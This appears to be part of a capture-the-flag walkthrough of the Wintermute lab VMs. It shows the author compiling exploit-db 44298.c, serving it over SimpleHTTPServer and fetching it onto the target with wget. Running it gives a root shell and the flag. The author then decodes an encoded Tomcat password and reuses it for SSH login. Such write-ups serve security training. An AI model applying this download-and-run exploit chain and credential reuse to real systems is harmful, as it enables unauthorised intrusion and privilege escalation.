<div>I'll see if I can cross compile the exploit and transfer it to the remote machine using the SimpleHTTPServer.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# cp /usr/share/exploitdb/exploits/linux/local/44298.c .</div>
    <div>root@kali:~/Walkthroughs/wintermute# gcc -o pwn2 44298.c</div>
    <div>root@kali:~/Walkthroughs/wintermute# python -m SimpleHTTPServer 4321<br /></div>
    <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
    <div>10.183.0.211 - - [01/May/2019 17:18:48] "GET /pwn2 HTTP/1.1" 200 -</div>
</div>
<div><br /></div>
<div>And on the remote machine...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>ta@neuromancer:/tmp$ wget -O pwn2 192.168.56.102:4321/pwn2</div>
    <div>--2019-05-01 14:18:47--Â Â http://192.168.56.102:4321/pwn2</div>
    <div>Connecting to 192.168.56.102:4321... connected.</div>
    <div>HTTP request sent, awaiting response... 200 OK</div>
    <div>Length: 17880 (17K) [application/octet-stream]</div>
    <div>Saving to: 'pwn2'</div>
    <div>
        <div><br /></div>
    </div>
    <div>pwn2Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 100%[=======================================================================&gt;]Â Â 17.46KÂ Â --.-KB/sÂ Â Â Â in 0sÂ Â Â Â Â Â </div>
    <div>
        <div><br /></div>
    </div>
    <div>2019-05-01 14:18:47 (257 MB/s) - 'pwn2' saved [17880/17880]</div>
    <div>
        <div><br /></div>
    </div>
    <div>ta@neuromancer:/tmp$ chmod +x pwn2<br /></div>
    <div>ta@neuromancer:/tmp$ ./pwn2</div>
    <div>task_struct = ffff88003c269c00</div>
    <div>uidptr = ffff880035000304</div>
    <div>spawning root shell</div>
    <div>root@neuromancer:/tmp# id</div>
    <div>uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(ta)</div>
</div>
<div><br /></div>
<div>We have root! Let's get the flag.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@neuromancer:/tmp# cd /root</div>
    <div>root@neuromancer:/root# cat flag.txt<br /></div>
    <div>be3306f431dae5ebc93eebb291f4914a</div>
</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Clean Up</h2>
</div>
<div><br /></div>
<div>OnÂ straylight...</div>
<div>*** STOPÂ /var/www/html/turing-bolo/thumbs ***</div>
<div>*** REMOVEÂ /var/www/html/turing-bolo/thumbs ***</div>
<div>*** STOP all socat processes ***</div>
<div><br /></div>
<div>OnÂ neuromancer...</div>
<div>*** STOP /tmp/pwn ***</div>
<div>*** REMOVE /tmp/pwn ***</div>
<div>*** STOP /tmp/pwn2 ***</div>
<div>*** REMOVE /tmp/pwn2 ***</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Additional Info</h2>
</div>
<div><br /></div>
<div><b>tomcat-users.xml</b></div>
<div><br /></div>
<div>Checking theÂ tomcat-users.xml file inÂ /usr/local/tomcat/conf on neuromancer, we see the credentials forÂ Lady3Jane (along with a funny message).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@neuromancer:/usr/local/tomcat/conf# cat tomcat-users.xml </div>
    <div>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div>
    <div>&lt;tomcat-users xmlns="http://tomcat.apache.org/xml"</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â version="1.0"&gt;</div>
    <div>&lt;!--</div>
    <div>Eng.,</div>
    <div>
        <div><br /></div>
    </div>
    <div>Tomcat is still using basic auth. I encoded the password so the AI's security scans don't flag it.</div>
    <div>
        <div><br /></div>
    </div>
    <div>Is this what Bob keeps talking about, "Security by obscurity?"</div>
    <div>
        <div><br /></div>
    </div>
    <div>Ed Occam//Sys.Engineer I//Night City</div>
    <div>"Harry, I took care of it" - Llyod Christmas</div>
    <div>--&gt;</div>
    <div>
        <div><br /></div>
    </div>
    <div>Â Â &lt;role rolename="manager-gui"/&gt;</div>
    <div>Â Â <font style="color: rgb(255, 38, 0); --inversion-type-color: simple;">&lt;user username="Lady3Jane" password="&amp;gt;&amp;#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;" roles="manager-gui"/&gt;</font>
    </div>
    <div>
        <div><br /></div>
    </div>
    <div>&lt;!--</div>
    <div>Â Â &lt;role rolename="role1"/&gt;</div>
    <div>Â Â &lt;user username="tomcat" password="&lt;must-be-changed&gt;" roles="tomcat"/&gt;</div>
    <div>Â Â &lt;user username="both" password="&lt;must-be-changed&gt;" roles="tomcat,role1"/&gt;</div>
    <div>Â Â &lt;user username="role1" password="&lt;must-be-changed&gt;" roles="role1"/&gt;</div>
    <div>--&gt;</div>
    <div>&lt;/tomcat-users&gt;</div>
</div>
<div><br /></div>
<div>The decoded string translates to '&gt;!Xx3JanexX!&lt;'. SinceÂ lady3jane is a valid account on the server, I tried to SSH to the server using those credentials... and it worked.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# ssh -p 34483 lady3jane@10.183.0.211</div>
    <div> ----------------------------------------------------------------</div>
    <div>|Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Neuromancer Secure Remote AccessÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â |</div>
    <div>| UNAUTHORIZED ACCESS will be investigated by the Turing PoliceÂ Â |</div>
    <div> ----------------------------------------------------------------</div>
    <div>lady3jane@10.183.0.211's password: </div>
    <div>Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</div>
    <div>
        <div><br /></div>
    </div>
    <div> * Documentation:Â Â https://help.ubuntu.com</div>
    <div> * Management:Â Â Â Â Â https://landscape.canonical.com</div>
    <div> * Support:Â Â Â Â Â Â Â Â https://ubuntu.com/advantage</div>
    <div>
        <div><br /></div>
    </div>
    <div>94 packages can be updated.</div>
    <div>44 updates are security updates.</div>
    <div>
        <div><br /></div>
    </div>
    <div>lady3jane@neuromancer:~$</div>
</div>
<div><br /></div>
<div><br /></div>